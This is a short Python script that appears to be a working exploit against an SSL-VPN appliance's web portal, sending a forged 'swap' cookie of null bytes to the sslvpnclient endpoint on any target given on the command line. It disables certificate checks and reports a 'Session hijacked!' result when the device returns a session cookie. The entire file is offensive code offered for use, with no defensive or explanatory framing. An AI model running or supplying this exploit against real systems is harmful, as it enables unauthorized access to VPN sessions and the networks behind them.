#!/usr/bin/env python3
import base64, requests, sys, warnings
warnings.filterwarnings('ignore')

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <target> [port]")
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2]) if len(sys.argv) > 2 else 4433
url = f"https://{target}:{port}/cgi-bin/sslvpnclient?launchplatform="
cookie = base64.b64encode(b'\x00' * 32).decode()

session = requests.Session()
session.verify = False

print(f"[*] Exploiting {target}:{port}")
response = session.get(url, cookies={"swap": cookie}, timeout=10)
print(f"[+] Status: {response.status_code}")

if "Set-Cookie" in response.headers:
    print(f"[+] Session hijacked!")
    print(f"[+] Headers: {dict(response.headers)}")
